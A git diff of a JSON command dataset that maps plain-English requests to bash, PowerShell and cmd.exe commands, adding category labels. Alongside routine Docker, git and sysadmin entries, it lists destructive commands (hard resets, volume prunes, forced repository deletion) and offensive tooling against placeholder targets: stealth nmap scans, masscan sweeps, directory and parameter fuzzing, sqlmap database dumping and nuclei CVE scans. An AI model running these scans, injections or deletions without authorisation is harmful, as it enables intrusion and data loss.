@@ -2,6 +2,7 @@
   {
     "action_id": "docker_cleanup_stopped_and_unused_images",
     "category": "DOCKER",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "clean up all stopped docker containers and unused images",
     "default_cmd": "docker container prune -f && docker image prune -a -f",
     "powershell_cmd": "docker container prune -f; docker image prune -a -f",
@@ -12,6 +13,7 @@
   {
     "action_id": "docker_prune_containers_only",
     "category": "DOCKER",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "remove all stopped docker containers",
     "default_cmd": "docker container prune -f",
     "powershell_cmd": "docker container prune -f",
@@ -22,6 +24,7 @@
   {
     "action_id": "docker_prune_images_only",
     "category": "DOCKER",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "remove all unused and dangling docker images",
     "default_cmd": "docker image prune -a -f",
     "powershell_cmd": "docker image prune -a -f",
@@ -32,6 +35,7 @@
   {
     "action_id": "docker_prune_system_all",
     "category": "DOCKER",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "deep clean all unused docker containers images networks and volumes",
     "default_cmd": "docker system prune -a --volumes -f",
     "powershell_cmd": "docker system prune -a --volumes -f",
@@ -42,6 +46,7 @@
   {
     "action_id": "docker_stop_all_containers",
     "category": "DOCKER",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "stop all running docker containers",
     "default_cmd": "docker stop $(docker ps -q)",
     "powershell_cmd": "docker ps -q | ForEach-Object { docker stop $_ }",
@@ -52,6 +57,7 @@
   {
     "action_id": "docker_run_postgres",
     "category": "DOCKER",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "run postgres container in background on port {port}",
     "default_cmd": "docker run -d --name {name} -p {port}:5432 -e POSTGRES_PASSWORD={password} postgres",
     "powershell_cmd": "docker run -d --name {name} -p {port}:5432 -e POSTGRES_PASSWORD={password} postgres",
@@ -62,6 +68,7 @@
   {
     "action_id": "docker_run_redis",
     "category": "DOCKER",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "run redis cache in background on port {port}",
     "default_cmd": "docker run -d --name {name} -p {port}:6379 redis:alpine",
     "powershell_cmd": "docker run -d --name {name} -p {port}:6379 redis:alpine",
@@ -72,6 +79,7 @@
   {
     "action_id": "docker_logs_follow",
     "category": "DOCKER",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "follow live logs of container {container}",
     "default_cmd": "docker logs -f {container}",
     "powershell_cmd": "docker logs -f {container}",
@@ -82,6 +90,7 @@
   {
     "action_id": "docker_exec_shell",
     "category": "DOCKER",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "open interactive bash shell inside container {container}",
     "default_cmd": "docker exec -it {container} /bin/bash",
     "powershell_cmd": "docker exec -it {container} /bin/bash",
@@ -92,6 +101,7 @@
   {
     "action_id": "docker_compose_up_detached",
     "category": "DOCKER",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "start all docker compose services in background",
     "default_cmd": "docker compose up -d",
     "powershell_cmd": "docker compose up -d",
@@ -102,6 +112,7 @@
   {
     "action_id": "docker_compose_down_volumes",
     "category": "DOCKER",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "stop and remove all docker compose services and volumes",
     "default_cmd": "docker compose down -v",
     "powershell_cmd": "docker compose down -v",
@@ -112,6 +123,7 @@
   {
     "action_id": "git_undo_last_commit_keep_staged",
     "category": "GIT",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "undo last commit and keep my changes staged",
     "default_cmd": "git reset --soft HEAD~1",
     "powershell_cmd": "git reset --soft HEAD~1",
@@ -122,6 +134,7 @@
   {
     "action_id": "git_undo_last_commit_unstage",
     "category": "GIT",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "undo last commit and unstage changes",
     "default_cmd": "git reset HEAD~1",
     "powershell_cmd": "git reset HEAD~1",
@@ -132,6 +145,7 @@
   {
     "action_id": "git_discard_all_local_changes",
     "category": "GIT",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "discard all uncommitted changes across working directory",
     "default_cmd": "git reset --hard HEAD && git clean -fd",
     "powershell_cmd": "git reset --hard HEAD; git clean -fd",
@@ -142,6 +156,7 @@
   {
     "action_id": "git_unstage_file",
     "category": "GIT",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "unstage file {file}",
     "default_cmd": "git restore --staged {file}",
     "powershell_cmd": "git restore --staged {file}",
@@ -152,6 +167,7 @@
   {
     "action_id": "git_create_switch_branch",
     "category": "GIT",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "create a new branch {branch} and switch to it",
     "default_cmd": "git checkout -b {branch}",
     "powershell_cmd": "git checkout -b {branch}",
@@ -162,6 +178,7 @@
   {
     "action_id": "git_show_graph_oneline",
     "category": "GIT",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "show git commit history as a clean one-line graph",
     "default_cmd": "git log --graph --oneline --decorate --all",
     "powershell_cmd": "git log --graph --oneline --decorate --all",
@@ -172,6 +189,7 @@
   {
     "action_id": "git_push_force_with_lease",
     "category": "GIT",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "push current branch with force with lease",
     "default_cmd": "git push --force-with-lease",
     "powershell_cmd": "git push --force-with-lease",
@@ -182,6 +200,7 @@
   {
     "action_id": "git_stash_wip",
     "category": "GIT",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "stash changes including untracked files with message {msg}",
     "default_cmd": "git stash push -u -m \"{msg}\"",
     "powershell_cmd": "git stash push -u -m \"{msg}\"",
@@ -192,6 +211,7 @@
   {
     "action_id": "git_stash_pop",
     "category": "GIT",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "apply and pop the most recent stash",
     "default_cmd": "git stash pop",
     "powershell_cmd": "git stash pop",
@@ -200,148 +220,9 @@
     "explanation": "Reapplies the top stash entry and drops it from the stash stack."
   },
   {
-    "action_id": "proc_kill_port",
-    "category": "PROCESS",
-    "canonical_nl": "find what process is using port {port} and kill it",
-    "default_cmd": "fuser -k {port}/tcp",
-    "powershell_cmd": "Get-Process -Id (Get-NetTCPConnection -LocalPort {port}).OwningProcess | Stop-Process -Force",
-    "cmd_exe": "for /f \"tokens=5\" %a in ('netstat -aon ^| find \":{port}\"') do taskkill /F /PID %a",
-    "is_destructive": true,
-    "explanation": "Finds the process holding the target network port and forcefully terminates it."
-  },
-  {
-    "action_id": "proc_find_port",
-    "category": "PROCESS",
-    "canonical_nl": "show process listening on port {port}",
-    "default_cmd": "lsof -i:{port}",
-    "powershell_cmd": "Get-NetTCPConnection -LocalPort {port} | Format-Table -AutoSize",
-    "cmd_exe": "netstat -ano | findstr :{port}",
-    "is_destructive": false,
-    "explanation": "Inspects network sockets to identify the PID and program bound to the port."
-  },
-  {
-    "action_id": "proc_top_memory",
-    "category": "PROCESS",
-    "canonical_nl": "show top 5 memory consuming processes",
-    "default_cmd": "ps aux --sort=-%mem | head -n 6",
-    "powershell_cmd": "Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 5 -Property Name,Id,WorkingSet64",
-    "cmd_exe": "tasklist /fi \"memusage gt 100000\"",
-    "is_destructive": false,
-    "explanation": "Sorts all active processes by resident memory footprint and displays top 5."
-  },
-  {
-    "action_id": "proc_top_cpu",
-    "category": "PROCESS",
-    "canonical_nl": "show top 5 cpu consuming processes",
-    "default_cmd": "ps aux --sort=-%cpu | head -n 6",
-    "powershell_cmd": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 -Property Name,Id,CPU",
-    "cmd_exe": "tasklist",
-    "is_destructive": false,
-    "explanation": "Lists processes sorted in descending order of CPU load percentage."
-  },
-  {
-    "action_id": "sys_free_disk_space",
-    "category": "SYSTEM",
-    "canonical_nl": "check free disk space on all mounted drives in human readable format",
-    "default_cmd": "df -h",
-    "powershell_cmd": "Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | Select-Object DeviceID, VolumeName, @{N='Free(GB)';E={[math]::Round($_.FreeSpace/1GB, 2)}}, @{N='Used(GB)';E={[math]::Round(($_.Size - $_.FreeSpace)/1GB, 2)}}, @{N='Total(GB)';E={[math]::Round($_.Size/1GB, 2)}}, @{N='PercentFree';E={[math]::Round(($_.FreeSpace/$_.Size)*100, 1)}} | Format-Table -AutoSize",
-    "cmd_exe": "powershell -NoProfile -Command \"Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | Select-Object DeviceID, VolumeName, @{N='Free(GB)';E={[math]::Round($_.FreeSpace/1GB, 2)}}, @{N='Used(GB)';E={[math]::Round(($_.Size - $_.FreeSpace)/1GB, 2)}}, @{N='Total(GB)';E={[math]::Round($_.Size/1GB, 2)}}, @{N='PercentFree';E={[math]::Round(($_.FreeSpace/$_.Size)*100, 1)}} | Format-Table -AutoSize\"",
-    "is_destructive": false,
-    "explanation": "Reports available storage, used capacity, and mountpoints across all volumes."
-  },
-  {
-    "action_id": "sys_memory_usage",
-    "category": "SYSTEM",
-    "canonical_nl": "show current ram memory usage in human readable format",
-    "default_cmd": "free -h",
-    "powershell_cmd": "Get-CimInstance Win32_OperatingSystem | Select-Object @{Name='TotalGB';Expression={[math]::Round($_.TotalVisibleMemorySize/1MB,2)}},@{Name='FreeGB';Expression={[math]::Round($_.FreePhysicalMemory/1MB,2)}}",
-    "cmd_exe": "systeminfo | findstr /C:\"Total Physical Memory\" /C:\"Available Physical Memory\"",
-    "is_destructive": false,
-    "explanation": "Displays total, used, free, and cached system RAM in gigabytes/megabytes."
-  },
-  {
-    "action_id": "fs_find_delete_logs_older_30d",
-    "category": "FILESYSTEM",
-    "canonical_nl": "find all log files older than 30 days and delete them",
-    "default_cmd": "find . -name \"*.log\" -mtime +30 -delete",
-    "powershell_cmd": "Get-ChildItem -Recurse -Filter *.log | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) } | Remove-Item -Force",
-    "cmd_exe": "forfiles /P . /M *.log /D -30 /C \"cmd /c del @path\"",
-    "is_destructive": true,
-    "explanation": "Searches recursively for *.log files with mtime > 30 days and removes them."
-  },
-  {
-    "action_id": "fs_find_large_files",
-    "category": "FILESYSTEM",
-    "canonical_nl": "find all files larger than 100MB and sort by size",
-    "default_cmd": "find . -type f -size +100M -exec ls -lh {} + | sort -k5 -rh",
-    "powershell_cmd": "Get-ChildItem -Recurse -File | Where-Object Length -gt 100MB | Sort-Object Length -Descending | Select-Object -First 10 Name,Length",
-    "cmd_exe": "forfiles /S /M * /C \"cmd /c if @fsize GEQ 104857600 echo @path @fsize\"",
-    "is_destructive": false,
-    "explanation": "Scans directory tree for files exceeding 100 megabytes and sorts them descending."
-  },
-  {
-    "action_id": "fs_compress_tar_gz",
-    "category": "FILESYSTEM",
-    "canonical_nl": "compress folder {dir} into archive {out}.tar.gz",
-    "default_cmd": "tar -czvf {out}.tar.gz {dir}",
-    "powershell_cmd": "tar -czvf {out}.tar.gz {dir}",
-    "cmd_exe": "tar -czvf {out}.tar.gz {dir}",
-    "is_destructive": false,
-    "explanation": "Creates a gzip-compressed tar archive from the specified directory."
-  },
-  {
-    "action_id": "fs_compress_zip",
-    "category": "FILESYSTEM",
-    "canonical_nl": "compress folder {dir} into zip archive {out}.zip",
-    "default_cmd": "zip -r {out}.zip {dir}",
-    "powershell_cmd": "Compress-Archive -Path {dir} -DestinationPath {out}.zip -Force",
-    "cmd_exe": "tar -a -c -f {out}.zip {dir}",
-    "is_destructive": false,
-    "explanation": "Recursively archives folder contents into standard ZIP format."
-  },
-  {
-    "action_id": "fs_count_lines_code",
-    "category": "FILESYSTEM",
-    "canonical_nl": "count total lines of code in all {ext} files",
-    "default_cmd": "find . -name \"*.{ext}\" -exec wc -l {} +",
-    "powershell_cmd": "(Get-ChildItem -Recurse -Filter *.{ext} | Get-Content | Measure-Object -Line).Lines",
-    "cmd_exe": "for /f \"tokens=*\" %a in ('dir /s /b *.{ext}') do @type \"%a\" | find /c /v \"\"",
-    "is_destructive": false,
-    "explanation": "Recursively tallies total newline count across all matching source files."
-  },
-  {
-    "action_id": "net_get_public_ip",
-    "category": "NETWORK",
-    "canonical_nl": "show my public ip address",
-    "default_cmd": "curl -s https://api.ipify.org",
-    "powershell_cmd": "(Invoke-RestMethod -Uri https://api.ipify.org).Trim()",
-    "cmd_exe": "curl -s https://api.ipify.org",
-    "is_destructive": false,
-    "explanation": "Queries public IP echo endpoint via curl to retrieve WAN address."
-  },
-  {
-    "action_id": "net_test_port_connectivity",
-    "category": "NETWORK",
-    "canonical_nl": "test if port {port} on host {host} is reachable",
-    "default_cmd": "nc -zv {host} {port}",
-    "powershell_cmd": "Test-NetConnection -ComputerName {host} -Port {port}",
-    "cmd_exe": "curl -v telnet://{host}:{port}",
-    "is_destructive": false,
-    "explanation": "Attempts TCP handshake to verify remote port availability without payload."
-  },
-  {
-    "action_id": "net_flush_dns_cache",
-    "category": "NETWORK",
-    "canonical_nl": "flush local dns resolver cache",
-    "default_cmd": "sudo systemd-resolve --flush-caches",
-    "powershell_cmd": "Clear-DnsClientCache",
-    "cmd_exe": "ipconfig /flushdns",
-    "is_destructive": false,
-    "explanation": "Clears the operating system's local DNS resolver name lookup cache."
-  },
-  {
     "action_id": "k8s_get_pods_namespace",
     "category": "K8S",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "list all pods in namespace {ns}",
     "default_cmd": "kubectl get pods -n {ns}",
     "powershell_cmd": "kubectl get pods -n {ns}",
@@ -352,6 +233,7 @@
   {
     "action_id": "k8s_restart_deployment",
     "category": "K8S",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "restart deployment {deploy} in namespace {ns}",
     "default_cmd": "kubectl rollout restart deployment/{deploy} -n {ns}",
     "powershell_cmd": "kubectl rollout restart deployment/{deploy} -n {ns}",
@@ -362,6 +244,7 @@
   {
     "action_id": "polyglot_compile_cpp20",
     "category": "POLYGLOT_DEV",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "compile modern C++20 source file with optimizations and warnings",
     "default_cmd": "g++ -std=c++20 -O2 -Wall -Wextra {file} -o {out}",
     "powershell_cmd": "g++ -std=c++20 -O2 -Wall -Wextra {file} -o {out}.exe",
@@ -372,6 +255,7 @@
   {
     "action_id": "polyglot_compile_rust",
     "category": "POLYGLOT_DEV",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "build standalone rust file or cargo project in release mode",
     "default_cmd": "cargo build --release",
     "powershell_cmd": "cargo build --release",
@@ -382,6 +266,7 @@
   {
     "action_id": "polyglot_run_java_single_file",
     "category": "POLYGLOT_DEV",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "run single java source file directly without separate compile step",
     "default_cmd": "java {file}",
     "powershell_cmd": "java {file}",
@@ -392,6 +277,7 @@
   {
     "action_id": "polyglot_build_golang",
     "category": "POLYGLOT_DEV",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "compile go binary stripped of debug symbols and dwarf tables",
     "default_cmd": "go build -ldflags=\"-s -w\" -o {out} {file}",
     "powershell_cmd": "go build -ldflags=\"-s -w\" -o {out}.exe {file}",
@@ -402,6 +288,7 @@
   {
     "action_id": "git_undo_last_commit_soft",
     "category": "GIT",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "undo the last commit and keep changes staged in index",
     "default_cmd": "git reset --soft HEAD~1",
     "powershell_cmd": "git reset --soft HEAD~1",
@@ -412,6 +299,7 @@
   {
     "action_id": "git_revert_commit_clean",
     "category": "GIT",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "safely revert public commit creating inverse change",
     "default_cmd": "git revert --no-edit {hash}",
     "powershell_cmd": "git revert --no-edit {hash}",
@@ -422,6 +310,7 @@
   {
     "action_id": "git_reflog_inspect_history",
     "category": "GIT",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "view git reflog state transitions to recover deleted commits or branches",
     "default_cmd": "git reflog -n 15",
     "powershell_cmd": "git reflog -n 15",
@@ -432,6 +321,7 @@
   {
     "action_id": "github_delete_repo_cli",
     "category": "GIT",
+    "master_category": "POLYGLOT_DEV",
     "canonical_nl": "delete remote github repository using gh cli without confirmation prompt",
     "default_cmd": "gh repo delete {repo} --yes",
     "powershell_cmd": "gh repo delete {repo} --yes",
@@ -440,8 +330,163 @@
     "explanation": "Permanently deletes the specified GitHub repository via GitHub CLI."
   },
   {
+    "action_id": "proc_kill_port",
+    "category": "PROCESS",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "find what process is using port {port} and kill it",
+    "default_cmd": "fuser -k {port}/tcp",
+    "powershell_cmd": "Get-Process -Id (Get-NetTCPConnection -LocalPort {port}).OwningProcess | Stop-Process -Force",
+    "cmd_exe": "for /f \"tokens=5\" %a in ('netstat -aon ^| find \":{port}\"') do taskkill /F /PID %a",
+    "is_destructive": true,
+    "explanation": "Finds the process holding the target network port and forcefully terminates it."
+  },
+  {
+    "action_id": "proc_find_port",
+    "category": "PROCESS",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "show process listening on port {port}",
+    "default_cmd": "lsof -i:{port}",
+    "powershell_cmd": "Get-NetTCPConnection -LocalPort {port} | Format-Table -AutoSize",
+    "cmd_exe": "netstat -ano | findstr :{port}",
+    "is_destructive": false,
+    "explanation": "Inspects network sockets to identify the PID and program bound to the port."
+  },
+  {
+    "action_id": "proc_top_memory",
+    "category": "PROCESS",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "show top 5 memory consuming processes",
+    "default_cmd": "ps aux --sort=-%mem | head -n 6",
+    "powershell_cmd": "Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 5 -Property Name,Id,WorkingSet64",
+    "cmd_exe": "tasklist /fi \"memusage gt 100000\"",
+    "is_destructive": false,
+    "explanation": "Sorts all active processes by resident memory footprint and displays top 5."
+  },
+  {
+    "action_id": "proc_top_cpu",
+    "category": "PROCESS",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "show top 5 cpu consuming processes",
+    "default_cmd": "ps aux --sort=-%cpu | head -n 6",
+    "powershell_cmd": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 -Property Name,Id,CPU",
+    "cmd_exe": "tasklist",
+    "is_destructive": false,
+    "explanation": "Lists processes sorted in descending order of CPU load percentage."
+  },
+  {
+    "action_id": "sys_free_disk_space",
+    "category": "SYSTEM",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "check free disk space on all mounted drives in human readable format",
+    "default_cmd": "df -h",
+    "powershell_cmd": "Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | Select-Object DeviceID, VolumeName, @{N='Free(GB)';E={[math]::Round($_.FreeSpace/1GB, 2)}}, @{N='Used(GB)';E={[math]::Round(($_.Size - $_.FreeSpace)/1GB, 2)}}, @{N='Total(GB)';E={[math]::Round($_.Size/1GB, 2)}}, @{N='PercentFree';E={[math]::Round(($_.FreeSpace/$_.Size)*100, 1)}} | Format-Table -AutoSize",
+    "cmd_exe": "powershell -NoProfile -Command \"Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | Select-Object DeviceID, VolumeName, @{N='Free(GB)';E={[math]::Round($_.FreeSpace/1GB, 2)}}, @{N='Used(GB)';E={[math]::Round(($_.Size - $_.FreeSpace)/1GB, 2)}}, @{N='Total(GB)';E={[math]::Round($_.Size/1GB, 2)}}, @{N='PercentFree';E={[math]::Round(($_.FreeSpace/$_.Size)*100, 1)}} | Format-Table -AutoSize\"",
+    "is_destructive": false,
+    "explanation": "Reports available storage, used capacity, and mountpoints across all volumes."
+  },
+  {
+    "action_id": "sys_memory_usage",
+    "category": "SYSTEM",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "show current ram memory usage in human readable format",
+    "default_cmd": "free -h",
+    "powershell_cmd": "Get-CimInstance Win32_OperatingSystem | Select-Object @{Name='TotalGB';Expression={[math]::Round($_.TotalVisibleMemorySize/1MB,2)}},@{Name='FreeGB';Expression={[math]::Round($_.FreePhysicalMemory/1MB,2)}}",
+    "cmd_exe": "systeminfo | findstr /C:\"Total Physical Memory\" /C:\"Available Physical Memory\"",
+    "is_destructive": false,
+    "explanation": "Displays total, used, free, and cached system RAM in gigabytes/megabytes."
+  },
+  {
+    "action_id": "fs_find_delete_logs_older_30d",
+    "category": "FILESYSTEM",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "find all log files older than 30 days and delete them",
+    "default_cmd": "find . -name \"*.log\" -mtime +30 -delete",
+    "powershell_cmd": "Get-ChildItem -Recurse -Filter *.log | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) } | Remove-Item -Force",
+    "cmd_exe": "forfiles /P . /M *.log /D -30 /C \"cmd /c del @path\"",
+    "is_destructive": true,
+    "explanation": "Searches recursively for *.log files with mtime > 30 days and removes them."
+  },
+  {
+    "action_id": "fs_find_large_files",
+    "category": "FILESYSTEM",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "find all files larger than 100MB and sort by size",
+    "default_cmd": "find . -type f -size +100M -exec ls -lh {} + | sort -k5 -rh",
+    "powershell_cmd": "Get-ChildItem -Recurse -File | Where-Object Length -gt 100MB | Sort-Object Length -Descending | Select-Object -First 10 Name,Length",
+    "cmd_exe": "forfiles /S /M * /C \"cmd /c if @fsize GEQ 104857600 echo @path @fsize\"",
+    "is_destructive": false,
+    "explanation": "Scans directory tree for files exceeding 100 megabytes and sorts them descending."
+  },
+  {
+    "action_id": "fs_compress_tar_gz",
+    "category": "FILESYSTEM",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "compress folder {dir} into archive {out}.tar.gz",
+    "default_cmd": "tar -czvf {out}.tar.gz {dir}",
+    "powershell_cmd": "tar -czvf {out}.tar.gz {dir}",
+    "cmd_exe": "tar -czvf {out}.tar.gz {dir}",
+    "is_destructive": false,
+    "explanation": "Creates a gzip-compressed tar archive from the specified directory."
+  },
+  {
+    "action_id": "fs_compress_zip",
+    "category": "FILESYSTEM",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "compress folder {dir} into zip archive {out}.zip",
+    "default_cmd": "zip -r {out}.zip {dir}",
+    "powershell_cmd": "Compress-Archive -Path {dir} -DestinationPath {out}.zip -Force",
+    "cmd_exe": "tar -a -c -f {out}.zip {dir}",
+    "is_destructive": false,
+    "explanation": "Recursively archives folder contents into standard ZIP format."
+  },
+  {
+    "action_id": "fs_count_lines_code",
+    "category": "FILESYSTEM",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "count total lines of code in all {ext} files",
+    "default_cmd": "find . -name \"*.{ext}\" -exec wc -l {} +",
+    "powershell_cmd": "(Get-ChildItem -Recurse -Filter *.{ext} | Get-Content | Measure-Object -Line).Lines",
+    "cmd_exe": "for /f \"tokens=*\" %a in ('dir /s /b *.{ext}') do @type \"%a\" | find /c /v \"\"",
+    "is_destructive": false,
+    "explanation": "Recursively tallies total newline count across all matching source files."
+  },
+  {
+    "action_id": "net_get_public_ip",
+    "category": "NETWORK",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "show my public ip address",
+    "default_cmd": "curl -s https://api.ipify.org",
+    "powershell_cmd": "(Invoke-RestMethod -Uri https://api.ipify.org).Trim()",
+    "cmd_exe": "curl -s https://api.ipify.org",
+    "is_destructive": false,
+    "explanation": "Queries public IP echo endpoint via curl to retrieve WAN address."
+  },
+  {
+    "action_id": "net_test_port_connectivity",
+    "category": "NETWORK",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "test if port {port} on host {host} is reachable",
+    "default_cmd": "nc -zv {host} {port}",
+    "powershell_cmd": "Test-NetConnection -ComputerName {host} -Port {port}",
+    "cmd_exe": "curl -v telnet://{host}:{port}",
+    "is_destructive": false,
+    "explanation": "Attempts TCP handshake to verify remote port availability without payload."
+  },
+  {
+    "action_id": "net_flush_dns_cache",
+    "category": "NETWORK",
+    "master_category": "SYSADMIN_CORE",
+    "canonical_nl": "flush local dns resolver cache",
+    "default_cmd": "sudo systemd-resolve --flush-caches",
+    "powershell_cmd": "Clear-DnsClientCache",
+    "cmd_exe": "ipconfig /flushdns",
+    "is_destructive": false,
+    "explanation": "Clears the operating system's local DNS resolver name lookup cache."
+  },
+  {
     "action_id": "sysadmin_systemctl_service_restart",
     "category": "SYSADMIN_CORE",
+    "master_category": "SYSADMIN_CORE",
     "canonical_nl": "restart and inspect systemd service status",
     "default_cmd": "systemctl restart {svc} && systemctl status {svc} --no-pager",
     "powershell_cmd": "Restart-Service {svc}; Get-Service {svc}",
@@ -452,6 +497,7 @@
   {
     "action_id": "sysadmin_ss_listening_ports",
     "category": "SYSADMIN_CORE",
+    "master_category": "SYSADMIN_CORE",
     "canonical_nl": "display all listening TCP and UDP sockets with process names",
     "default_cmd": "ss -tulpn",
     "powershell_cmd": "Get-NetTCPConnection -State Listen",
@@ -462,6 +508,7 @@
   {
     "action_id": "sysadmin_disk_usage_top_folders",
     "category": "SYSADMIN_CORE",
+    "master_category": "SYSADMIN_CORE",
     "canonical_nl": "find largest space-consuming directories and files on disk",
     "default_cmd": "du -ahx / 2>/dev/null | sort -rh | head -n 20",
     "powershell_cmd": "Get-ChildItem C:\\ -Recurse -ErrorAction SilentlyContinue | Sort-Object Length -Descending | Select-Object -First 20",
@@ -472,6 +519,7 @@
   {
     "action_id": "recon_nmap_syn_stealth",
     "category": "RECON_SCANNING",
+    "master_category": "RECON_SCANNING",
     "canonical_nl": "execute fast SYN stealth port scan with service versions and default scripts",
     "default_cmd": "nmap -sS -sV -sC -T4 -v {target}",
     "powershell_cmd": "nmap -sS -sV -sC -T4 -v {target}",
@@ -482,6 +530,7 @@
   {
     "action_id": "recon_nmap_ping_bypass_pn",
     "category": "RECON_SCANNING",
+    "master_category": "RECON_SCANNING",
     "canonical_nl": "scan target ports skipping ICMP host discovery probe",
     "default_cmd": "nmap -Pn -sV -sC -T4 {target}",
     "powershell_cmd": "nmap -Pn -sV -sC -T4 {target}",
@@ -492,6 +541,7 @@
   {
     "action_id": "recon_masscan_fast_sweep",
     "category": "RECON_SCANNING",
+    "master_category": "RECON_SCANNING",
     "canonical_nl": "sweep large subnet for open web ports at 1000 packets per second",
     "default_cmd": "masscan -p80,443,8080 {subnet} --rate=1000",
     "powershell_cmd": "masscan -p80,443,8080 {subnet} --rate=1000",
@@ -500,8 +550,42 @@
     "explanation": "Asynchronously probes subnet for HTTP/HTTPS ports at 1000 pps."
   },
   {
+    "action_id": "recon_nmap_full_udp",
+    "category": "RECON_SCANNING",
+    "master_category": "RECON_SCANNING",
+    "canonical_nl": "scan target for top UDP ports with version detection",
+    "default_cmd": "nmap -sU --top-ports 100 -T4 {target}",
+    "powershell_cmd": "wsl nmap -sU --top-ports 100 -T4 {target}",
+    "cmd_exe": "wsl nmap -sU --top-ports 100 -T4 {target}",
+    "is_destructive": false,
+    "explanation": "Audits UDP service availability across the top 100 most common ports."
+  },
+  {
+    "action_id": "recon_amass_enum_domains",
+    "category": "RECON_SCANNING",
+    "master_category": "RECON_SCANNING",
+    "canonical_nl": "enumerate subdomains passively using amass",
+    "default_cmd": "amass enum -passive -d {domain} -o subdomains.txt",
+    "powershell_cmd": "wsl amass enum -passive -d {domain} -o subdomains.txt",
+    "cmd_exe": "wsl amass enum -passive -d {domain} -o subdomains.txt",
+    "is_destructive": false,
+    "explanation": "Discovers target subdomains through passive OSINT sources without direct connection."
+  },
+  {
+    "action_id": "recon_whatweb_fingerprint",
+    "category": "RECON_SCANNING",
+    "master_category": "RECON_SCANNING",
+    "canonical_nl": "fingerprint web technologies and headers with whatweb",
+    "default_cmd": "whatweb http://{target} -v",
+    "powershell_cmd": "wsl whatweb http://{target} -v",
+    "cmd_exe": "wsl whatweb http://{target} -v",
+    "is_destructive": false,
+    "explanation": "Detects CMS, server headers, frameworks, and JavaScript libraries on target website."
+  },
+  {
     "action_id": "web_gobuster_dir_fuzz",
     "category": "WEB_SECURITY",
+    "master_category": "WEB_SECURITY",
     "canonical_nl": "brute-force web directories and file extensions with gobuster",
     "default_cmd": "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 -q",
     "powershell_cmd": "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30 -q",
@@ -512,6 +596,7 @@
   {
     "action_id": "web_ffuf_parameter_fuzz",
     "category": "WEB_SECURITY",
+    "master_category": "WEB_SECURITY",
     "canonical_nl": "discover hidden GET query parameters using ffuf and status code filters",
     "default_cmd": "ffuf -u \"{url}?FUZZ=1\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,301,302",
     "powershell_cmd": "ffuf -u \"{url}?FUZZ=1\" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,301,302",
@@ -522,6 +607,7 @@
   {
     "action_id": "web_sqlmap_dump_dbs",
     "category": "WEB_SECURITY",
+    "master_category": "WEB_SECURITY",
     "canonical_nl": "automatically detect and dump database schemas via sqlmap batch mode",
     "default_cmd": "sqlmap -u \"{url}\" --batch --dbs",
     "powershell_cmd": "sqlmap -u \"{url}\" --batch --dbs",
@@ -530,8 +616,42 @@
     "explanation": "Performs automated SQL injection payload testing and enumerates database names."
   },
   {
+    "action_id": "web_nuclei_cve_scan",
+    "category": "WEB_SECURITY",
+    "master_category": "WEB_SECURITY",
+    "canonical_nl": "scan target web application for known CVEs using nuclei",
+    "default_cmd": "nuclei -u http://{target} -severity medium,high,critical",
+    "powershell_cmd": "nuclei -u http://{target} -severity medium,high,critical",
+    "cmd_exe": "nuclei -u http://{target} -severity medium,high,critical",
+    "is_destructive": false,
+    "explanation": "Audits web applications against curated community vulnerability and misconfiguration templates."
+  },
+  {
+    "action_id": "web_wpscan_plugin_enum",
+    "category": "WEB_SECURITY",
